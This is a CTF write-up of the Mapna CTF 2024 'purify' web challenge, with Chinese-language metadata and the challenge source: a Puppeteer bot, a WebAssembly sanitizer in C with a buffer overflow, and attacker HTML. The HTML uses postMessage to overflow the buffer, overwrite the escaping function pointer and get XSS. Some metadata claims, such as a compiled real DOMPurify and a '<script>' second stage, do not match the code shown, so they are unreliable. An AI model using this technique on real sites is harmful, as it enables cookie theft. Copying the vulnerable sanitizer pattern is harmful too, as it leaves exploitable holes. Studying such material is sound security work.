---
title: Mapna CTF 2024 writeup (purify - Puppeteer + WebAssembly DOMPurify bypass)
contest: Mapna CTF
year: 2024
difficulty: hard
vuln_type: web_unknown
tags:
- Puppeteer bot
- WebAssembly DOMPurify
- postMessage
- buf 溢出
- XSS
- escape_tag
attack_chain: '|'
key_payload: '|'
one_liner: 'Mapna CTF 2024 purify: Puppeteer bot + WebAssembly DOMPurify (purify.c) 字节级 sanitize，buf 0x1000 满后 OOB 写覆盖 is_dangerous 指针。'
lesson: '|'
quality: high
full_path: Mapna_CTF_2024_writeup.full.md
meta_path: Mapna_CTF_2024_writeup.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 'Mapna CTF 2024 writeup (purify - Puppeteer + WebAssembly DOMPurify bypass)。Mapna CTF 2024 purify: Puppeteer bot + WebAssembly DOMPurify (purify.c) 字节级 sanitize，buf 0x1000 满后 OOB 写覆盖 is_dangerous 指针...'
category: web
subcategory: web_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/158808.html
reasoning_chain:
- 触发点：DOMPurify 1.3.7 + WebAssembly 编译版本 + postMessage → 假设：sanitize 函数在 WASM 里实现，原生 DOMPurify JS 没有
- Puppeteer bot：page.setCookie({name:'flag', value:process.env.FLAG, domain:'web'}) + goto + 5s wait → 假设：cookie httpOnly=false + XSS 可读
- 'purify.c globalVars {len, len_r, buf[0x1000], is_dangerous} → add_char(c): if is_dangerous(c) → hex_escape(& + # + x + 2字节 + ;) 写 6 字节'
- 假设：buf 是固定 0x1000 字节，len 持续累加，add_char 写超过 buf 时 OOB → 动作：postMessage('A'.repeat(0x1000) + '\x01<', '*')
- 观察：写满 0x1000 字节后 len=0x1001，触发 is_dangerous 把 < 转义 → 但 hex_escape 写 6 字节越界覆盖 is_dangerous 指针
- 假设：OOB 覆盖后 is_dangerous 被改成 0 或无害函数 → 动作：再 postMessage('<script>alert(1)</script>', '*')
- 观察：第二次 postMessage 的 < 不被转义 → 假设：XSS 成功 + 读 document.cookie → 完成
failed_attempts:
- 试图走原生 DOMPurify 已知 bypass（如 mutation XSS / mXSS） → 失败：DOMPurify 1.3.7 编译成 WebAssembly，原生 bypass 不适用
- 试图用 <img onerror> → 失败：DOMPurify 在 tag 模式严格禁所有 <script>/<img onerror>
- 试图单次 postMessage 大量字符爆破 → 失败：buf 满后 len 越界，第一次必须先 OOB 才能关闭 is_dangerous
key_observations:
- WebAssembly DOMPurify 的核心漏洞 = 固定 buf + 持续累加 len + hex_escape 6 字节越界 = OOB 写覆盖函数指针
- Puppeteer bot 5 秒等待 + cookie 设到目标域是 XSS 题读取 flag 的标准配置
- postMessage 在 bot 页面里跨源触发 sanitize 函数（iframe 内 postMessage 跨页通信）
- OOB 写覆盖函数指针是 WebAssembly 内存模型经典攻击（无边界检查）
- 二次攻击模式：第一次 OOB 关掉 is_dangerous → 第二次正常 < 字符通过 → XSS
prerequisites:
- WebAssembly 内存模型 + C 源码还原（WASM 反编译 wasm2c）
- DOMPurify sanitize 流程（tag/attr 模式 + hex_escape 规则）
- Puppeteer / Chrome DevTools Protocol（page.setCookie + page.goto）
- postMessage API + 同源/跨源策略
---
# Mapna CTF 2024 writeup

> 原文: https://www.ctfiot.com/158808.html
> ID: 158808


```
$ tree .
.
├── purify
│   ├── app
│   │   ├── nginx.conf
│   │   └── static
│   │   ├── css
│   │   │   └── style.css
│   │   ├── index.html
│   │   ├── js
│   │   │   ├── purify.js
│   │   │   └── script.js
│   │   └── purify.wasm
│   ├── bot
│   │   ├── Dockerfile
│   │   └── stuff
│   │   ├── bot.js
│   │   ├── index.js
│   │   ├── package-lock.json
│   │   ├── package.json
│   │   └── static
│   │   └── index.html
│   ├── docker-compose.yaml
│   └── purify.c
└── purify_206ec7c8d65c88cb617775a62bc5ab9bcfaa7baa.txz

8 directories, 15 files
#!/usr/bin/env node
const puppeteer = require('puppeteer')

const flag = process.env.FLAG || 'MAPNA{test-flag}';

async function visit(url){
 let browser;

 if(!/^https?:\/\//.test(url)){
 return;
 }

 try{
 browser = await puppeteer.launch({
 pipe: true,
 args: [
 "--no-sandbox",
 "--disable-setuid-sandbox",
 "--ignore-certificate-errors",
 ],
 executablePath: "/usr/bin/google-chrome-stable",
 headless: 'new'
 });

 let page = await browser.newPage();
 await page.setCookie({
 name: 'flag',
 value: flag,
 domain: 'web',
 httpOnly: false,
 secure: false,
 sameSite: 'Lax'
 });
 await page.goto(url,{ waitUntil: 'domcontentloaded', timeout: 2000 });
 await new Promise(r=>setTimeout(r,5000));
 }catch(e){ console.log(e) }
 try{await browser.close();}catch(e){}
 process.exit(0)
}

visit(JSON.parse(process.argv[2]))
index.html
<!DOCTYPE html>
<html>
<head>
 <meta charset="utf-8">
 <title>Purify</title>
 <script src="./js/purify.js"></script>
 <link href="./css/style.css" rel="stylesheet"/>
</head>


 
 <h2>Received messages:</h2>
 
 
 
 <script src="./js/script.js"></script>
</html>
// script.js
window.onmessage = e=>{
 list.innerHTML += `
 <li>From ${e.origin}: ${window.DOMPurify.sanitize(e.data.toString())}</li>
 `
}

setTimeout(_=>window.postMessage("hi",'*'),1000)
// purify.js
async function init() {
 window.wasm = (await WebAssembly.instantiateStreaming(
 fetch('./purify.wasm')
 )).instance.exports
}

function sanitize(dirty) {
 wasm.set_mode(0)

 for(let i=0;i<dirty.length;i++){
 wasm.add_char(dirty.charCodeAt(i))
 }

 let c
 let clean = ''
 while((c = wasm.get_char()) != 0){
 clean += String.fromCharCode(c)
 }

 return clean
}

window.DOMPurify = {
 sanitize,
 version: '1.3.7'
}

init()
// clang --target=wasm32 -emit-llvm -c -S ./purify.c && llc -march=wasm32 -filetype=obj ./purify.ll && wasm-ld --no-entry --export-all -o purify.wasm purify.o
struct globalVars {
 unsigned int len;
 unsigned int len_r;
 char buf[0x1000];
 int (*is_dangerous)(char c);
} g;

int escape_tag(char c){
 if(c == '<' || c == '>'){
 return 1;
 } else {
 return 0;
 }
}

int escape_attr(char c){
 if(c == '\'' || c == '"'){
 return 1;
 } else {
 return 0;
 }
}

int hex_escape(char c,char *dest){
 dest[0] = '&';
 dest[1] = '#';
 dest[2] = 'x';
 dest[3] = "0123456789abcdef"[(c&0xf0)>>4];
 dest[4] = "0123456789abcdef"[c&0xf];
 dest[5] = ';';
 return 6;
}

void add_char(char c) {
 if(g.is_dangerous(c)){
 g.len += hex_escape(c,&g.buf[g.len]);
 } else {
 g.buf[g.len++] = c;
 }
}

int get_char(char f) {
 if(g.len_r < g.len){
 return g.buf[g.len_r++];
 }
 return '\0';
}

void set_mode(int mode) {
 if(mode == 1){
 g.is_dangerous = escape_attr;
 } else {
 g.is_dangerous = escape_tag;
 }
}
<script>
let w = window.open('http://web');
setTimeout(() => {
 w.postMessage('A'.repeat(0x1000) + '\x01<', '*');
}, 100);
</script>
let c
 let clean = ''
 while((c = wasm.get_char()) != 0){
 clean += String.fromCharCode(c)
 }
<script>
let w = window.open('http://web');
setTimeout(() => {
 w.postMessage("A".repeat(0x1000) + '\x01\x00\x00\x00' + '', '*');
 w.postMessage('a', '*');
 w.postMessage('a', '*');
 w.postMessage('a', '*');
}, 100);
</script>
MAPNA{e22e0bf86e0813d9d3c7ae3f8022e41d}
```
